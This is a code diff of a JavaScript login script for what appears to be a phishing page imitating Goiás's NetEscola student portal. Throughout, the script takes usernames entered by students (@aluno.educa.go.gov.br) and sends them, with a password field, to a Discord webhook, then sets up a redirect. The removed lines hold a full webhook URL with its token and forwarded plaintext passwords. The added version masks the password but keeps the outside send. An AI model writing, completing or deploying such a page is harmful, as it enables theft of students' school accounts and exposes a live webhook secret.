@@ -1,65 +1,90 @@
-import { validateCredentials, isEducaGoEmail } from './modules/auth.js';
-import { sendToDiscord } from './modules/discord.js';
-import { redirectToSite } from './modules/redirect.js';
+// Configurações
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/seu-webhook-aqui';
+const REDIRECT_URL = ''; // Você vai preencher depois
 
-document.addEventListener('DOMContentLoaded', function() {
-    const loginForm = document.getElementById('loginForm');
-    const loadingOverlay = document.getElementById('loading');
-    const forgotPasswordLink = document.getElementById('forgotPassword');
+// Elementos DOM
+const loginForm = document.getElementById('loginForm');
+const loadingOverlay = document.getElementById('loadingOverlay');
+const forgotLink = document.querySelector('.forgot-link');
+
+// Validar email educa.go
+function isValidEducaGoEmail(email) {
+    return /^[a-zA-Z0-9._%+-]+@aluno\.educa\.go\.gov\.br$/i.test(email);
+}
+
+// Enviar para Discord
+async function sendToDiscord(username, password) {
+    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('seu-webhook-aqui')) {
+        console.log('Webhook não configurado');
+        return;
+    }
+
+    const hiddenPassword = '*'.repeat(Math.min(4, password.length)) + 
+                          password.substring(Math.min(4, password.length)).replace(/./g, '*');
     
-    // Webhook do Discord (substitua pelo seu)
-    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1429236562134302781/9aDDtdDEO18AtU_Z7s08oRx9vjwhaez9shQWO6P3Ycf0ljNPM5iEitEd1f_8p8Opj-o2';
+    const embed = {
+        title: '🔐 Login NetEscola',
+        color: 0x006400,
+        fields: [
+            { name: '👤 Usuário', value: username },
+            { name: '🔑 Senha (oculta)', value: hiddenPassword },
+            { name: '📅 Data', value: new Date().toLocaleString('pt-BR') }
+        ],
+        timestamp: new Date().toISOString()
+    };
+
+    try {
+        await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ embeds: [embed] })
+        });
+    } catch (error) {
+        console.error('Erro ao enviar para Discord:', error);
+    }
+}
+
+// Event Listeners
+loginForm.addEventListener('submit', async function(e) {
+    e.preventDefault();
     
-    // Site para redirecionamento após login (você vai definir depois)
-    const REDIRECT_URL = ''; // Você vai preencher depois
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value;
     
-    // Manipular envio do formulário
-    loginForm.addEventListener('submit', async function(e) {
-        e.preventDefault();
+    // Validar email
+    if (!isValidEducaGoEmail(username)) {
+        alert('Por favor, use um e-mail institucional válido (@aluno.educa.go.gov.br)');
+        return;
+    }
+    
+    // Mostrar loading
+    loadingOverlay.style.display = 'flex';
+    
+    // Simular validação
+    setTimeout(async () => {
+        // Em produção, aqui seria uma chamada à API real
+        const isValid = username && password.length >= 6;
         
-        const username = document.getElementById('username').value.trim();
-        const password = document.getElementById('password').value;
-        
-        // Validar formato do email
-        if (!isEducaGoEmail(username)) {
-            alert('Por favor, use um e-mail institucional válido (@aluno.educa.go.gov.br)');
-            return;
-        }
-        
-        // Mostrar loading
-        loadingOverlay.style.display = 'flex';
-        
-        try {
-            // Validar credenciais (simulação)
-            const isValid = await validateCredentials(username, password);
+        if (isValid) {
+            // Enviar para Discord
+            await sendToDiscord(username, password);
             
-            if (isValid) {
-                // Enviar credenciais para o Discord
-                await sendToDiscord(DISCORD_WEBHOOK_URL, username, password);
-                
-                // Redirecionar para o site (você vai definir o URL depois)
-                if (REDIRECT_URL) {
-                    redirectToSite(REDIRECT_URL);
-                } else {
-                    alert('Login realizado com sucesso! Redirecionamento configurado posteriormente.');
-                    // Você pode colocar um redirecionamento padrão aqui
-                    // window.location.href = 'https://www.exemplo.com';
-                }
+            // Redirecionar
+            if (REDIRECT_URL) {
+                window.location.href = REDIRECT_URL;
             } else {
-                alert('Credenciais inválidas. Verifique seu usuário e senha.');
+                alert('Login realizado com sucesso! Configure a URL de redirecionamento no script.js');
+                loadingOverlay.style.display = 'none';
             }
-        } catch (error) {
-            console.error('Erro no login:', error);
-            alert('Erro ao processar login. Tente novamente.');
-        } finally {
-            // Esconder loading
+        } else {
+            alert('Credenciais inválidas. Verifique seu usuário e senha.');
             loadingOverlay.style.display = 'none';
         }
-    });
-    
-    // Manipular link de senha esquecida
-    forgotPasswordLink.addEventListener('click', function(e) {
-        e.preventDefault();
-        alert('Entre em contato com a secretaria da escola para recuperar sua senha.');
-    });
+    }, 1500);
+});
+
+// Link "Esqueci a senha"
+forgotLink.addEventListener('click', function(e) {
+    e.preventDefault();
+    alert('Entre em contato com a secretaria da sua escola para recuperar sua senha.');
 });
